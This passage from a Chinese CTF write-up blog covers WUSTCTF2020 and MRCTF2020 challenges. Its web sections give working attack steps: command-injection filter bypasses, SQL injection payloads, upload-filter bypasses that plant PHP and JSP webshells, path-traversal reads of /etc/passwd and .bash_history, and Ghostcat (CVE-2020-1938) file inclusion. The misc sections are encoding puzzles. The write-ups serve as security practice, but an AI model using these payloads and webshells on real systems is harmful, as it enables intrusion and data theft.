</span><br><span class="line"></span><br><span class="line"><span class="comment">//get flag </span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'get_flag'</span>]))&#123; </span><br><span class="line">    $get_flag = $_GET[<span class="string">'get_flag'</span>]; </span><br><span class="line">    <span class="keyword">if</span>(!strstr($get_flag,<span class="string">" "</span>))&#123; </span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"cat"</span>, <span class="string">"wctf2020"</span>, $get_flag); </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;"</span>; </span><br><span class="line">        system($get_flag); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"快到非洲了"</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"去非洲吧"</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>intval()函数可以用十六进制等于0，intval($num + 1)会强制转化来绕过</p>
<p>$md5==md5($md5)这个需要爆破出来一个0e开头的md5加密后还是0e开头的字符串（百度也行</p>
<p>官方wp那里嫖来的脚本（<a href="https://www.52hertz.tech/2020/03/30/wctf2020_official_wp/#%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E-24-solves" target="_blank" rel="noopener">52HeRtz</a>）</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">global</span> dict_az</span><br><span class="line">	dict_az = <span class="string">'abcdefghijklmnopqrstuvwxyz'</span></span><br><span class="line">	i = <span class="number">0</span></span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		result = <span class="string">'0e'</span></span><br><span class="line">		result += str(i)</span><br><span class="line">		i = i + <span class="number">1</span></span><br><span class="line">		hashed_s = hashlib.md5(result.encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line">		r = re.match(<span class="string">'^0e[0-9]&#123;30&#125;'</span>, hashed_s)</span><br><span class="line">		<span class="keyword">if</span> r:</span><br><span class="line">			print(<span class="string">"[+] found! md5( &#123;&#125; ) ---&gt; &#123;&#125;"</span>.format(result, hashed_s))</span><br><span class="line">			exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> i % <span class="number">1000000</span> == <span class="number">0</span>:</span><br><span class="line">			print(<span class="string">"[+] current value: &#123;&#125;       &#123;&#125; iterations, continue..."</span>.format(result, str(i)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	main()</span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] found! md5( 0e215962017 ) ---&gt; 0e291242476940776845150308577824</span></span><br></pre></td></tr></table></figure></div>

<p>绕过后，<code>get_flag=ls</code>看一下都有啥文件，发现flag文件<code>fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</code></p>
<p>过滤了空格、cat、wctf2020，可以构造<code>get_flag=ca\t${IFS}flll*</code>，得到flag</p>
<h3 id="颜值成绩查询"><a href="#颜值成绩查询" class="headerlink" title="颜值成绩查询"></a>颜值成绩查询</h3><p>整数型注入，过滤了空格和union，sqlmap的UA</p>
<p>用/**/代替空格，双写union绕过:ununionion</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">猜列</span><br><span class="line">1&#x2F;**&#x2F;order&#x2F;**&#x2F;by&#x2F;**&#x2F;3</span><br><span class="line">-1&#x2F;**&#x2F;ununionion&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,group_concat(schema_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.schemata</span><br><span class="line">查表</span><br><span class="line">-1&#x2F;**&#x2F;ununionion&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.tables&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x3D;&#39;ctf&#39;</span><br><span class="line">查列</span><br><span class="line">-1&#x2F;**&#x2F;ununionion&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,group_concat(column_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_name&#x3D;&#39;flag&#39;</span><br><span class="line"></span><br><span class="line">-1&#x2F;**&#x2F;ununionion&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,group_concat(value)&#x2F;**&#x2F;from&#x2F;**&#x2F;ctf.flag</span><br></pre></td></tr></table></figure></div>

<h3 id="CV-Maker"><a href="#CV-Maker" class="headerlink" title="CV Maker"></a>CV Maker</h3><p>注册、登录后，文件上传绕过exif_imagetype()就好，加个文件头GIF89a</p>
<p>对后缀没有限制上传php就好,蚁剑连上在根目录就会发现flag（原题好像是权限不够，需要运行readflag</p>
<h3 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a>easyweb</h3><p>考点：JSP、CVE-2020-1938幽灵猫文件包含</p>
<p>参考的博客：<a href="https://imagin.vip/?p=1126#easyweb" target="_blank" rel="noopener">IMAGIN’S BLOG</a>、<a href="https://www.gem-love.com/ctf/2176.html#easyweb" target="_blank" rel="noopener">颖奇L’Amore</a>、<a href="http://github.mrkaixin.computer/2020/04/03/WUST-CTF2020/" target="_blank" rel="noopener">Mr.Kaixin</a>、<a href="https://www.52hertz.tech/2020/03/30/wctf2020_official_wp/#easyweb-23-solves" target="_blank" rel="noopener">52HeRtz’s Blog</a></p>
<p>这题卡了好久，还是第一次做这种根据CVE改的CTF题目，最初看官方wp纠结于pocsuite的使用，配置了好久，用不来。。然后就去看了下别的大佬的博客，自己又摸索了半天才搞出来。。</p>
<p>这里有两种解法。</p>
<p>预期解就是上传一个jsp命令执行🐎，然后用幽灵🐱漏洞去包含这个🐎，执行后通过回显得知flag的位置。</p>
<p>非预期就是通过任意文件下载来读/home/tomajp/.bashrc_history，从而得到执行生成flag时的存放位置，进而去读flag所在文件得到flag，但是在buu上由于是docker生成的所以不需要去通过tomajp用户去生产flag所以就无非预期了。(其实还有，如果你能猜到根目录下存放flag的文件的名字，不过基本不可能。。因为它叫<code>flag78bt787it8b9b098j0k80k0ggg</code></p>
<p>非预期解还挺简单的:</p>
<p>1.任意上传一个文件，然后用错误的文件名去读一下，文件路径就会暴露出来</p>
<a href="/2020/04/02/WUSTCTF2020/3.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/04/02/WUSTCTF2020/3.png" src="/img/loading.gif" class="lazyload"></a>

<p>2.<code>download?file=../../../../../../../etc/passwd</code>读到存在tomajp用户，然后下载它的bash_history文件 <code>download?file=../../../../../../../home/tomajp/.bash_history</code>发现执行过的命令，发现flag存放的文件夹，然后读取flag存放文件夹<code>download?file=../../../../../../../flaaaag/what_you_want</code>得到flag</p>
<p>预期解：</p>
<p>1.上传一个jsp🐎</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">jsp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">java.io.InputStream in = Runtime.getRuntime().exec(<span class="string">"执行的命令"</span>).getInputStream();</span><br><span class="line"><span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line"><span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>];</span><br><span class="line">out.print(<span class="string">"&lt;pre&gt;"</span>);</span><br><span class="line"><span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123;</span><br><span class="line">	out.println(<span class="keyword">new</span> String(b));</span><br><span class="line">&#125;</span><br><span class="line">out.print(<span class="string">"&lt;/pre&gt;"</span>);</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">执行的命令:</span></span><br><span class="line"><span class="comment">ls -al \ 被这个\坑傻了自动把后面的"转译了报错字符串闭合问题，不懂java的我还以为是字符串里的空格问题，后来偶然看到转译\\r的时候才反应过来所以我把命令换成了ls -al /</span></span><br><span class="line"><span class="comment">cat /flag78bt787it8b9b098j0k80k0ggg</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div>

<p>2.通过AJP包含这个jsp文件，从而执行其中的代码（<a href="https://github.com/00theway/Ghostcat-CNVD-2020-10487" target="_blank" rel="noopener">脚本地址</a></p>
<a href="/2020/04/02/WUSTCTF2020/1.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/04/02/WUSTCTF2020/1.png" src="/img/loading.gif" class="lazyload"></a>

<p>发现根目录下flag存放位置，读取得到flag</p>
<a href="/2020/04/02/WUSTCTF2020/2.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/04/02/WUSTCTF2020/2.png" src="/img/loading.gif" class="lazyload"></a>

<p>详细步骤：先把这个ajpShooter.py上传到buu的linux-lab的机子上，然后用这个脚本包含你上传的文件，最后通过各样式的命令执行得到flag。反弹shell那个jsp脚本我用不来。。（注意：<code>Lan Domain: 2554-169ec896-03d5-483f-97ca-369fbcc3bdbf</code>用的是局域网，用read可以去读取文件的内容，eval是输出文件执行的结果。</p>
<p>最后有时间去复现一下这个漏洞<a href="https://www.liuyixiang.com/post/109123.html" target="_blank" rel="noopener">CVE-2020-1938</a></p>
<h3 id="Train-Yourself-To-Be-Godly"><a href="#Train-Yourself-To-Be-Godly" class="headerlink" title="Train Yourself To Be Godly"></a>Train Yourself To Be Godly</h3><p>这个等学学目录跨越和jsp相关知识再来复现吧。</p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="girlfriend"><a href="#girlfriend" class="headerlink" title="girlfriend"></a>girlfriend</h3><p>考点：电话音、九键键盘</p>
<p>这次有点多就不对着表手解了，用个自动化工具<a href="https://github.com/hfeeki/dtmf" target="_blank" rel="noopener">dtmf-decoder</a>搞一下得到</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">999*666*88*2*777*33*6*999*4*444*777*555*333*777*444*33*66*3*7777</span><br></pre></td></tr></table></figure></div>

<p>对着九键键盘翻译一下得到flag：<code>flag{youaremygirlfriends}</code></p>
<h3 id="find-me"><a href="#find-me" class="headerlink" title="find_me"></a>find_me</h3><p>看备注+<a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=mangwen" target="_blank" rel="noopener">盲文转换</a></p>
<a href="/2020/04/02/WUSTCTF2020/4.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/04/02/WUSTCTF2020/4.png" src="/img/loading.gif" class="lazyload"></a>

<h3 id="爬"><a href="#爬" class="headerlink" title="爬"></a>爬</h3><p>判断文件类型为pdf，用wps等工具打开，图片后面有另一个图片，得到字符串</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x77637466323032307b746831735f31735f405f7064665f616e645f7930755f63616e5f7573655f70686f7430736830707d</span><br></pre></td></tr></table></figure></div>

<p><a href="https://www.qqxiuzi.cn/bianma/base.php?type=16" target="_blank" rel="noopener">base16解码</a>，得到flag：<code>wctf2020{th1s_1s_@_pdf_and_y0u_can_use_phot0sh0p}</code></p>
<h3 id="spaceclub"><a href="#spaceclub" class="headerlink" title="spaceclub"></a>spaceclub</h3><p>长空格为1，空格为0得到</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">011101110110001101110100011001100011001000110000001100100011000001111011011010000011001101110010011001010101111100110001011100110101111101111001001100000111010101110010010111110110011001101100010000000110011101011111011100110011000101111000010111110111001100110001011110000101111101110011001100010111100001111101</span><br></pre></td></tr></table></figure></div>

<p>2进制转ASCII，得到flag：<code>wctf2020{h3re_1s_y0ur_fl@g_s1x_s1x_s1x}</code></p>
<h3 id="alison-likes-jojo"><a href="#alison-likes-jojo" class="headerlink" title="alison_likes_jojo"></a>alison_likes_jojo</h3><p>文件分离、zip爆破、多次base64、outguess</p>
<p>boki.jpg分离出一个zip，爆破出来密码是<code>888866</code>，得到一个文本多次base64解密后得到key：<code>killerqueen</code></p>
<p>stegdetect测不出来。。看wp，没说啥软件测出来的。。就嗯猜？？</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">outguess -r jljy.jpg -k <span class="string">"killerqueen"</span> 1.txt</span><br></pre></td></tr></table></figure></div>

<p>得到flag：<code>wctf2020{pretty_girl_alison_likes_jojo}</code></p>
<h3 id="佛说：只能四天"><a href="#佛说：只能四天" class="headerlink" title="佛说：只能四天"></a>佛说：只能四天</h3><p>这个密码学题更像misc，就写到这里吧</p>
<p>新佛曰、社会主义核心价值观、栏栅、凯撒、base32</p>
<p>前三个还好，凯撒那个位数是真的有、恶心（官方解释：凯撒密码最广的是移位3位，很多在线解码器默认也是3位，所以这里也是3位移位。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">尊即寂修我劫修如婆愍闍嚤婆莊愍耨羅嚴是喼婆斯吶眾喼修迦慧迦嚩喼斯願嚤摩隸所迦摩吽即塞願修咒莊波斯訶喃壽祗僧若即亦嘇蜜迦須色喼羅囉咒諦若陀喃慧愍夷羅波若劫蜜斯哆咒塞隸蜜波哆咤慧聞亦吽念彌諸嘚嚴諦咒陀叻咤叻諦缽隸祗婆諦嚩阿兜宣囉吽色缽吶諸劫婆咤咤喼愍尊寂色缽嘚闍兜阿婆若叻般壽聞彌即念若降宣空陀壽愍嚤亦喼寂僧迦色莊壽吽哆尊僧喼喃壽嘚兜我空所吶般所即諸吽薩咤諸莊囉隸般咤色空咤亦喃亦色兜哆嘇亦隸空闍修眾哆咒婆菩迦壽薩塞宣嚩缽寂夷摩所修囉菩阿伏嘚宣嚩薩塞菩波吶波菩哆若慧愍蜜訶壽色咒兜摩缽摩諦劫諸陀即壽所波咤聞如訶摩壽宣咤彌即嚩蜜叻劫嘇缽所摩闍壽波壽劫修訶如嚩嘇囉薩色嚤薩壽修闍夷闍是壽僧劫祗蜜嚴嚩我若空伏諦念降若心吽咤隸嘚耨缽伏吽色寂喃喼吽壽夷若心眾祗喃慧嚴即聞空僧須夷嚴叻心願哆波隸塞吶心須嘇摩咤壽嘚吶夷亦心亦喃若咒壽亦壽囑囑</span><br><span class="line">平等文明自由友善公正自由诚信富强自由自由平等民主平等自由自由友善敬业平等公正平等富强平等自由平等民主和谐公正自由诚信平等和谐公正公正自由法治平等法治法治法治和谐和谐平等自由和谐自由自由和谐公正自由敬业自由文明和谐平等自由文明和谐平等和谐文明自由和谐自由和谐和谐平等和谐法治公正诚信平等公正诚信民主自由和谐公正民主平等平等平等平等自由和谐和谐和谐平等和谐自由诚信平等和谐自由自由友善敬业平等和谐自由友善敬业平等法治自由法治和谐和谐自由友善公正法治敬业公正友善爱国公正民主法治文明自由民主平等公正自由法治平等文明平等友善自由平等和谐自由友善自由平等文明自由民主自由平等平等敬业自由平等平等诚信富强平等友善敬业公正诚信平等公正友善敬业公正平等平等诚信平等公正自由公正诚信平等法治敬业公正诚信平等法治平等公正友善平等公正诚信自由公正友善敬业法治法治公正公正公正平等公正诚信自由公正和谐公正平等</span><br><span class="line">RLJDQTOVPTQ6O6duws5CD6IB5B52CC57okCaUUC3SO4OSOWG3LynarAVGRZSJRAEYEZ_ooe_doyouknowfence</span><br><span class="line">R5UALCUVJDCGD63RQISZTBOSO54JVBORP5SAT2OEQCWY6CGEO53Z67L_doyouknowCaesar_</span><br><span class="line">o5rxizrsgazda63onfpwqylpl54gsylom5pxq2lbnztv6zdbl53w67i</span><br></pre></td></tr></table></figure></div>

<p>最后再来个base32，得到flag：<code>wctf2020{ni_hao_xiang_xiang_da_wo}</code></p>
]]></content>
      <categories>
        <category>Write_up</category>
      </categories>
      <tags>
        <tag>Write_up</tag>
        <tag>Web</tag>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title>MRCTF2020</title>
    <url>/2020/03/30/MRCTF/</url>
    <content><![CDATA[<p>周末有两场比赛，WUST和MRCTF，都去看了一下（虽然没咋做题），密码学烦人啊（真滴难），还是在buu复盘有意思</p>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Ez-bypass"><a href="#Ez-bypass" class="headerlink" title="Ez_bypass"></a>Ez_bypass</h3><p>代码审计、弱类型</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">I put something in F12 <span class="keyword">for</span> you</span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line">$flag=<span class="string">'MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'gg'</span>])&amp;&amp;<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>])) &#123;</span><br><span class="line">    $id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">    $gg=$_GET[<span class="string">'gg'</span>];</span><br><span class="line">    <span class="keyword">if</span> (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'You got the first step'</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>])) &#123;</span><br><span class="line">            $passwd=$_POST[<span class="string">'passwd'</span>];</span><br><span class="line">            <span class="keyword">if</span> (!is_numeric($passwd))</span><br><span class="line">            &#123;</span><br><span class="line">                 <span class="keyword">if</span>($passwd==<span class="number">1234567</span>)</span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">'Good Job!'</span>;</span><br><span class="line">                     highlight_file(<span class="string">'flag.php'</span>);</span><br><span class="line">                     <span class="keyword">die</span>(<span class="string">'By Retr_0'</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">else</span></span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">"can you think twice??"</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'You can not get it !'</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'only one way to get the flag'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"You are not a real hacker!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Please input first'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;Please input first</span><br></pre></td></tr></table></figure></div>

<p>用数组绕过md5，用数字+字符绕过is_numeric()+弱等于</p>
<a href="/2020/03/30/MRCTF/1.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/30/MRCTF/1.png" src="/img/loading.gif" class="lazyload"></a>

<h3 id="PYWebsite"><a href="#PYWebsite" class="headerlink" title="PYWebsite"></a>PYWebsite</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">javascript</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">enc</span>(<span class="params">code</span>)</span>&#123;</span><br><span class="line">  hash = hex_md5(code);</span><br><span class="line">  <span class="keyword">return</span> hash;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">validate</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> code = <span class="built_in">document</span>.getElementById(<span class="string">"vcode"</span>).value;</span><br><span class="line">  <span class="keyword">if</span> (code != <span class="string">""</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(hex_md5(code) == <span class="string">"0cd4da0223c0b280829dc3ea458d655c"</span>)&#123;</span><br><span class="line">      alert(<span class="string">"您通过了验证！"</span>);</span><br><span class="line">      <span class="built_in">window</span>.location = <span class="string">"./flag.php"</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      alert(<span class="string">"你的授权码不正确！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    alert(<span class="string">"请输入授权码"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>在源码里发现这段js，这题卡在md5好久。。淦，原来是不用解密的，就是个前端验证，而且还破解不出来md5的值</p>
<p>直接访问/flag.php</p>
<a href="/2020/03/30/MRCTF/2.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/30/MRCTF/2.png" src="/img/loading.gif" class="lazyload"></a>

<p>构造X-Forwarded-For: 127.0.0.1，得到flag</p>
<h3 id="你传你🐎呢"><a href="#你传你🐎呢" class="headerlink" title="你传你🐎呢"></a>你传你🐎呢</h3><p>服务器搁美国，给爷整傻了，本来题不是很难，这发包没响应给爷心态搞崩了，后来连上蚁剑后终于知道为啥网站卡了。。</p>
<a href="/2020/03/30/MRCTF/3.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="30%" height="30%" data-src="/2020/03/30/MRCTF/3.png" src="/img/loading.gif" class="lazyload"></a>

<p>开题一看就知道是老祖安人了</p>
<a href="/2020/03/30/MRCTF/4.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/30/MRCTF/4.png" src="/img/loading.gif" class="lazyload"></a>

<p>先上传个解析图片为php的.htaccess文件，改一下Content-Type，再传个图片🐎</p>
<a href="/2020/03/30/MRCTF/5.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/30/MRCTF/5.png" src="/img/loading.gif" class="lazyload"></a>

<a href="/2020/03/30/MRCTF/6.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/30/MRCTF/6.png" src="/img/loading.gif" class="lazyload"></a>

<p>最后蚁剑连一下，得到flag</p>
<h3 id="Ezpop"><a href="#Ezpop" class="headerlink" title="Ezpop"></a>Ezpop</h3><p>第一次遇到反序列化构造pop链的题，还是入门晚了嗷，构造了好久还是不会利用类之间的关系，看了wp才恍然大悟。。</p>
<p><a href="https://segmentfault.com/a/1190000007250604" target="_blank" rel="noopener">一些函数</a></p>
<blockquote>
<ol>
<li>__construct()，类的构造函数</li>
<li>__destruct()，类的析构函数</li>
<li>__call()，在对象中调用一个不可访问方法时调用</li>
<li>__callStatic()，用静态方式中调用一个不可访问方法时调用</li>
<li>__get()，获得一个类的成员变量时调用</li>
<li>__set()，设置一个类的成员变量时调用</li>
<li>__isset()，当对不可访问属性调用isset()或empty()时调用</li>
<li>__unset()，当对不可访问属性调用unset()时被调用。</li>
<li>__sleep()，执行serialize()时，先会调用这个函数</li>
<li>__wakeup()，执行unserialize()时，先会调用这个函数</li>
<li>__toString()，类被当成字符串时的回应方法</li>
<li>__invoke()，调用函数的方式调用一个对象时的回应方法</li>
<li>__set_state()，调用var_export()导出类时，此静态方法会被调用。</li>
<li>__clone()，当对象复制完成时调用</li>
<li>__autoload()，尝试加载未定义的类</li>
<li>__debugInfo()，打印所需调试信息</li>
</ol>
</blockquote>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span><span class="params">($value)</span></span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123; <span class="comment">//用函数调用Modifier时调用</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var); <span class="comment">//通过var实现文件包含</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file=<span class="string">'index.php'</span>)</span></span>&#123;<span class="comment">//构造函数</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Welcome to '</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;<span class="comment">//类被当成字符串时调用</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;<span class="comment">//析构时调用</span></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/gopher|http|file|ftp|https|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span 